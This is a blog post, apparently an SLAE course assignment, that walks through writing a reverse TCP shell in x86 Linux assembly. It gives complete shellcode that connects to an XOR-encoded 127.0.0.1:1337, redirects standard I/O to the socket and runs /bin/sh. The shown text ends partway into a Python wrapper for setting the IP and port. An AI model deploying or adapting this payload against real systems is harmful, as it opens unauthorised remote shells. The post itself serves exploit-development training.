<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/grid.css type=text/css><link rel=stylesheet href=/css/highlight.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly"><meta name=twitter:title content="dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly"><meta itemprop=name content="dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly"><meta name=application-name content="dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2020-01-21T13:33:37Z"><meta property="article:published_time" content="2020-01-21T13:33:37Z"><base href=/www/slae-2-reverse_shell/><link rel=canonical href=/www/slae-2-reverse_shell/ itemprop=url><meta name=url content="/www/slae-2-reverse_shell/"><meta name=twitter:url content="/www/slae-2-reverse_shell/"><meta property="og:url" content="/www/slae-2-reverse_shell/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="Reverse TCP shell"><meta itemprop=description content="Reverse TCP shell"><meta property="og:description" content="Reverse TCP shell"><meta name=twitter:description content="Reverse TCP shell"><meta itemprop=image content="/img/hacker2.jpg"><meta property="og:image" content="/img/hacker2.jpg"><meta name=twitter:image content="/img/hacker2.jpg"><meta name=twitter:image:src content="/img/hacker2.jpg"><meta property="og:updated_time" content="2020-01-21T13:33:37Z"><link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml><title>dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly</title></head><body><div id=particles-js></div><main><div class=row><header class="col center"><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></div></div><div class=row><div class="col center"><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=content><article><h1>SLAE 2: Creating a reverse TCP shell in x86 Assembly</h1><br><p class=small style=color:#999><a href=/categories/programming>Programming</a> / January 21, 2020 â€¢ 7 min read</p><p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a></p><br><p><strong>What is a reverse TCP shell?</strong></p><p>A reverse TCP shell is a program that instead of listening for incoming connections, the program will connect to a remote system and provide a local shell. This is useful in situations where the victim system is behind NAT, meaning you can&rsquo;t directly connect to it, instead the server will connect to you. For this reason, reverse TCP shells are usually prefered over bind shells.</p><h2 id=okey-lets-do-this-leeeerooooyyy-jeeeeeenkins>Okey let&rsquo;s do this, leeeerooooyyy jeeeeeenkins</h2><p>Our previous article followed these steps to create a bind shell:</p><ol><li>Create a socket</li><li>Bind the socket</li><li>Listen for connections</li><li>Accept new connections</li><li>Execute shell</li></ol><p>This program will only need the following steps:</p><ol><li>Create a socket</li><li>Connect to remote system</li><li>Execute shell</li></ol><p>As can be seen, the reverse shell requires less steps and less code in order to function. For this assignment, I did not create a reference program in C, because most of the code was borrowed from our previous bind shell article. The only new code section in this assignment is the connect() function.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>global</span> <span class=no>_start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>section</span> <span class=no>.text</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>_start:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; zero out registers
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>xor</span> <span class=no>eax</span><span class=p>,</span> <span class=no>eax</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>ebx</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=no>edx</span><span class=p>,</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; -------------------------------------
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; # Setup socket
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=c>; socketcall()
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x66</span>     <span class=c>; __NR_socketcall 102
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>bl</span><span class=p>,</span> <span class=mi>0x1</span>      <span class=c>; SYS_SOCKET
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=c>; # Setup socket
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; Resulting file descriptor is saved to eax
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>push</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mi>0x1</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mi>0x2</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>esp</span>     <span class=c>; Arguments are located top of the stack
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>         <span class=c>; Tell the kernel it&#39;s time to boogie
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>edi</span><span class=p>,</span> <span class=no>eax</span>     <span class=c>; $eax contains the file descriptor created by socket(), store it in $edi for now
</span></span></span></code></pre></td></tr></table></div></div><p>After setting up the socketcall wrapper to call connect(), we need to setup the necessary arguments for <code>connect()</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl>    <span class=c>; ---------------------------------
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; # Setup connect
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; socketcall
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x66</span>     <span class=c>; socketcall()
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>bl</span><span class=p>,</span> <span class=mi>0x3</span>      <span class=c>; SYS_CONNECT
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=c>; setup sockaddr struct
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>push</span> <span class=mi>0xfeffff80</span>                 <span class=c>; 1.0.0.127
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>xor</span> <span class=no>dword</span> <span class=p>[</span><span class=no>esp</span><span class=p>],</span> <span class=mi>0xffffffff</span>     <span class=c>; xor IP with key 0xff to get real ip
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=no>word</span> <span class=mi>0x3905</span>        <span class=c>; htons(1337)
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>word</span> <span class=mi>0x2</span>           <span class=c>; AF_INET
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>esp</span>     <span class=c>; Store the address that points to our struct
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=c>; Push the arguments for connect()
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>push</span> <span class=mi>0x10</span>        <span class=c>; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>ecx</span>         <span class=c>; Points to our sockaddr_in struct
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>edi</span>         <span class=c>; Contains our file descriptor
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>esp</span>     <span class=c>; Second parameter for socketcall, points to arguments required by connect()
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>         <span class=c>; Tell the kernel let&#39;s go!
</span></span></span></code></pre></td></tr></table></div></div><p>The connect() code section is very similar to the setup needed for listen(), which can be seen in the previous bind shell article. The difference here is that we are specifying an IP to connect to. In order to avoid null bytes, the IP address is XORed with <code>0xffffffff</code>. This solution is not bulletproof, because if an IP would contain a <code>0xFF</code>, the result of the XOR operation would be <code>0x00</code>.</p><p>Now we use <code>dup2()</code> to set STDIN, STDOUT, STDERR to our file descriptor, and execute <code>/bin/sh</code>. This will expose a local shell to the connected socket, thereby acheiving a remote TCP shell.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>redirect:</span>
</span></span><span class=line><span class=cl>    <span class=c>; --------------------
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; # Setup dup2
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; redirect to stdin
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x3f</span>     <span class=c>; syscall number dup2 63 --&gt; 0x3f
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>edi</span>     <span class=c>; peer&#39;s file descriptor
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>edx</span>     <span class=c>; STDIN
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; redirect to stdout
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x3f</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>cl</span><span class=p>,</span> <span class=mi>0x1</span>      <span class=c>; STDOUT
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; redirect to stderr
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x3f</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>cl</span><span class=p>,</span> <span class=mi>0x2</span>      <span class=c>; STDERR
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>shell:</span>
</span></span><span class=line><span class=cl>    <span class=c>; --------------------
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; # Setup execv
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>xor</span> <span class=no>edx</span><span class=p>,</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; push //bin/sh onto the stack
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>push</span> <span class=mi>0x68732f6e</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mi>0x69622f2f</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; Set address of esp to ebx, which points
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; to //bin/sh
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>esp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=no>eax</span><span class=p>,</span> <span class=no>eax</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0xb</span>      <span class=c>; execv syscall
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>Final code:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span><span class=lnt>97
</span><span class=lnt>98
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=c>;---------------------------------
</span></span></span><span class=line><span class=cl><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c>; Author: dubs3c
</span></span></span><span class=line><span class=cl><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c>; Purpose:
</span></span></span><span class=line><span class=cl><span class=c>; Reverse TCP shell connect
</span></span></span><span class=line><span class=cl><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c>;----------------------------------
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl><span class=nf>global</span> <span class=no>_start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>section</span> <span class=no>.text</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>_start:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; zero out registers
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>xor</span> <span class=no>eax</span><span class=p>,</span> <span class=no>eax</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>ebx</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=no>edx</span><span class=p>,</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; -------------------------------------
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; # Setup socket
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=c>; socketcall()
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x66</span>     <span class=c>; __NR_socketcall 102
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>bl</span><span class=p>,</span> <span class=mi>0x1</span>      <span class=c>; SYS_SOCKET
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=c>; # Setup socket
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; Resulting file descriptor is saved to eax
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>push</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mi>0x1</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mi>0x2</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>esp</span>     <span class=c>; Arguments are located top of the stack
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>         <span class=c>; Tell the kernel it&#39;s time to boogie
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>edi</span><span class=p>,</span> <span class=no>eax</span>     <span class=c>; $eax contains the file descriptor created by socket(), store it in $edi for now
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=c>; ---------------------------------
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; # Setup connect
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; socketcall
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x66</span>     <span class=c>; socketcall()
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>bl</span><span class=p>,</span> <span class=mi>0x3</span>      <span class=c>; SYS_CONNECT
</span></span></span><span class=line><span class=cl><span class=c></span>    
</span></span><span class=line><span class=cl>    <span class=c>; setup sockaddr struct
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=mi>0xfeffff80</span>                 <span class=c>; 1.0.0.127
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>xor</span> <span class=no>dword</span> <span class=p>[</span><span class=no>esp</span><span class=p>],</span> <span class=mi>0xffffffff</span>     <span class=c>; xor IP with key 0xff to get real ip
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=no>word</span> <span class=mi>0x3905</span>        <span class=c>; htons(1337)
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>word</span> <span class=mi>0x2</span>           <span class=c>; AF_INET
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>esp</span>     <span class=c>; Store the address that points to our struct
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=c>; Push the arguments for connect()
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>push</span> <span class=mi>0x10</span>        <span class=c>; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>ecx</span>         <span class=c>; Points to our sockaddr_in struct
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>edi</span>         <span class=c>; Contains our file descriptor
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>esp</span>     <span class=c>; Second parameter for socketcall, points to arguments required by connect()
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>         <span class=c>; Tell the kernel let&#39;s go!
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl>    <span class=c>; --------------------
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; # Setup dup2
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; redirect to stdin
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x3f</span>     <span class=c>; syscall number dup2 63 --&gt; 0x3f
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>edi</span>     <span class=c>; peer&#39;s file descriptor
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>edx</span>     <span class=c>; STDIN
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; redirect to stdout
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x3f</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>cl</span><span class=p>,</span> <span class=mi>0x1</span>      <span class=c>; STDOUT
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; redirect to stderr
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x3f</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>cl</span><span class=p>,</span> <span class=mi>0x2</span>      <span class=c>; STDERR
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; --------------------
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; # Setup execv
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>xor</span> <span class=no>edx</span><span class=p>,</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; push //bin/sh onto the stack
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>push</span> <span class=mi>0x68732f6e</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mi>0x69622f2f</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; Set address of esp to ebx, which points
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; to //bin/sh
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>esp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=no>eax</span><span class=p>,</span> <span class=no>eax</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0xb</span>      <span class=c>; execv syscall
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c>; -----------------------------
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; THE END - HAVE A NICE SHELL |
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>; -----------------------------
</span></span></span></code></pre></td></tr></table></div></div><h2 id=making-the-address-and-port-configurable>Making the address and port configurable</h2><p>Right now the port <code>1337</code> and IP <code>127.0.0.1</code> is hardcoded, let&rsquo;s make a wrapper script in python which allows for setting a custom port and IP.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># one liner to convert e.g 127.0.0.1 to \x80\xff\xff\xfe XORed with key 0xff</span>
</span></span><span class=line><span class=cl>    <span class=c1># This is to avoid null bytes. However, a null byte can be introduced if one octet is 0xff</span>
